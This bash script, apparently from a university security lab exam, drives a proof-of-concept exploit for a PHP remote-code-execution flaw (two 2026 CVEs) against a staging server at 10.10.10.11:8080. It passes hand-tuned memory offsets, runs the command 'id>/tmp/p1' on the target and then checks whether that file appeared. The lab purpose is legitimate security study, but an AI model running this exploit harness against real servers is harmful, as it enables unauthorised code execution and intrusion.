#!/usr/bin/env bash
# w2-poc.sh — intento final documentado de W2/PHP2Shell sobre el staging 8080.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

POC="/tmp/opencode/php2shell/php2shell-CVE-2026-109618-CVE-2026-109619-PoC-main"

echo "== Target y sesion compartida =="
/home/kali/IS-EXAMEN-UNIDAD-1/informe/tools/vm.sh m1 'curl -s -o /dev/null -w "session2 HTTP %{http_code}\n" http://127.0.0.1:8080/session2.php; ls -l /tmp/sess_attacksessionid0001 2>/dev/null'

echo
echo "== PoC (PHP 8.4.26 NTS, prefork, offsets reales) =="
cd "$POC"
python3 poc_patched.py \
  -u http://10.10.10.11:8080/session2.php \
  -c 'id>/tmp/p1' \
  --proof-file '' --fetch '' \
  --zif-offset 0x52e6f0 --dtor-offset 0x72ffd0 \
  --profile lab --offsets-file '' --no-auto-offsets \
  --huge-mb 18

echo
echo "== Prueba de impacto =="
/home/kali/IS-EXAMEN-UNIDAD-1/informe/tools/vm.sh m1 'cat /tmp/p1 2>/dev/null || echo "sin /tmp/p1: no hubo RCE"'
